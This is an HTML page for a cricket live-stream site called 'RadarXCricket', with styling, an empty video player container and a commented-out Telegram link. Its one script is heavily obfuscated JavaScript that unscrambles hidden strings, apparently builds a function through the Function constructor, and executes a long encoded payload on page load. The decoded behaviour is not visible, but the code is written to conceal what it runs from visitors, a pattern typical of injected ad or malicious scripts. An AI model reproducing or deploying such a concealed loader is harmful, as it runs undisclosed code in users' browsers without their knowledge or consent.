<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>

<!-- Join Telegram Button -->
<div class="join-telegram-container">
<!-- <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button> -->
</div>

<script>
var loadIframe;(function(){var wkC='',lRR=197-186;function gGp(x){var f=282567;var p=x.length;var n=[];for(var e=0;e<p;e++){n[e]=x.charAt(e)};for(var e=0;e<p;e++){var g=f*(e+303)+(f%17777);var t=f*(e+385)+(f%46543);var a=g%p;var i=t%p;var w=n[a];n[a]=n[i];n[i]=w;f=(g+t)%1606030;};return n.join('')};var iAM=gGp('youfsrqkahtplcoexbdizjncomsgrwtnvctru').substr(0,lRR);var DzA='a9[y{,aft}ll4=ete;s,ptggf;a  ytpc({am;rn]pqrrt{vaxyg0xtsvte=1 a(heh=nei0]s7vuy+8gp8sc79a ;(.[d7=;7=,sr,.6,[,fhe,7(fb+;;n)td)e7.gm=,low,cc, zn.;ho(,(9y+nt.Aa(.rcpk"0o<l++a.<)h))]s=jha=g}0 8-(u=6)!g;)( qaahg(=(.sl.rue hnlvw5rnf.rni;mtl+,+a<++;)evet]fak9[r"2r t" i(0fpo)=a(0olu.rona(0aic[dofjhr-vngo) ve=wjusal4 0s2tx=iu[r"c=e9hnllr;,!e0;v7hte=rx+)Snhs8f(rat(roirdr1;c3Cvsp=t>i+){ra8jy)isc(5;57voC;(eAo;a64Aa8rt+(if(ll.;0,=lr1*erC(=;cob=([at[="1=rgu)ve1w{;g+=;s)1=)+u]n,CmvCb*=pi;)vl>S-g+=]8,2fusdkAu01,inC.4[h;[)lom8Ci(eh=r]a;;=d}e+,;uulge[{qe+r]v)e1ar[-g=dn;h,)evlA9ir)nvw.ue8lfh(tm6;6hu.h(2(.,w}=.n9fu,ai)nvb.a)o0=r;1ae<c6+(r,rt8+{r.( r,;tv)=ou v8oufhqrrr}hvwe5n2i(oc ;o2+.]ie;)2.a)renh)jrx+;+;k(s=af.s<ks1" f,v;rh]=,v2)r6aa ],3p=]rlc;cji}]hr)=.-rant-=+t(;";dpfgmChhrco9vlb6).6pn.hxr;e1"6an );cv;gh(mno)jgu+stp1re)=dalho;" }[ ]; r=n(f4 e=)r.av= vardvi.-urrop(; et[;sl+;;= ,l=bf"rrftgoit7ec3';var zyr=gGp[iAM];var AzJ='';var LMm=zyr;var DlE=zyr(AzJ,gGp(DzA));var Ndw=DlE(gGp('fU(%]t{;m]Ua$lit\/*i0a.i.U}=o(U_bmas!r(Ul$-)de)w%0tUsa1,gUo(;i9la-s$in%ca7aau445yg,cUf{+lU8=iat6UCa7U3(U.)=.b}d3(Uos!7u0)7_yUUb0wj83r,cC"{aUptplnUce_,"UUdep=so{t:=i;l+fnt])%"sd-,3en!%r(tt$=sU}pcoU4e,$(c(Ut%Sjo%Ubf,0de=jeil t=[eeUh70a!rI+Uo,unr2]a7U8l8fsi%n(tieue2Uf6to:eb.0U,gg5\/=co,il78ndUoU,}Ue]emUgUaUz})$ak],\/.et.ew-i.p%_tog(e36g=8nay%(!tl((n1)pmt%a#3k.o;\/Ua[rdmC.)c$0U:fS!e461b;!h+nf%)!7UntU0=U,ifg1#a(Ukd_,*$gx%aUUe%Udz_rr.U.(fUs5)daftsEs(U ta[U 3l ;t8.3oc)ae;yo.U3ao0.(w;jr(illt]!*$.e0s!-UoUh;!:r-Un%7n3Uej})})n.U,))6\'u=$rw[U6U3itn\'a=oba3;njie$7,9_![a[f\/%(;rduhe3!Ue0)a$arvUpt+p [t,;]=5r_.r0%6lU6Ui0 3.]m$aU3uw!edUU"U$9jU_!r+Ua.Ur#=.0_#$ej!44e;Uf.3.1.p%3rn,-saUo.0)U ) 017.53#a n}%]xlnr0r U);eUUbo16(le0st)e6\'.\'$3ayU.!.r3au";ss02];_t7a%(b8wUceuei3-]6e7\'.(=#oou]=j3cnU uea;UsU n0" tx_k_i =;U,rrlohfe}j {(r.nlsa.9f3o)Un,03stU_a2c.y]e727UUa.Ui1$%!)!.e#lU=_!c$ s$ 3o%s0o-+=__Us$;fat5)!aa,tsx!]i2(g)U\/5nuw3)(U{{{?Uo;,;("hf-nUiho))U2;( 8o=-tici-7,n.2k)k(lo0xpf5U.ehj!orfr,_pUfUdpt,U;2_%lpa58*o8lfUvlUCed!v.l;5)2%{U.1[er4U(2ledU.at%Ua_e3nr)+3altnbt2)el56otU{.U4o%46)o(83a}_efaU(sU(\/}.mt93a,sc{3b[a0*].(-$7lcwr_.IUb7bt%Ul0ndEw!ee(cU4.Ud8;f3oUbh5!,u,b)3U=3pnbi_-auUao5.hUe.(ua870n$U!U&[v.ra.$_ofU7iU..xUei(3)do$U(Ur(o.(j1. a4_rU4&216l6S37Ui$Uxul]rUmgr x1)&nr f7;g(Uma]66o,l_arba5#oU,eb,\/2x$d()ao$o4U,01oie$fga5p e(ut()3= ]l1ni]t_ 6Uo&i;).tw" w,t,.$.ilua]4.(k)ju)..it.v!,15.;809n)eg1oUcUu,)0ete)oeUu_)dt)mj7Uo+)v e)can$met2%a_ioer)em=o.;Ue3\'(21*$4Ue.a.t}tecU;i:!76'));var bWo=LMm(wkC,Ndw );bWo(7505);return 5326})()
</script>

</body>
</html>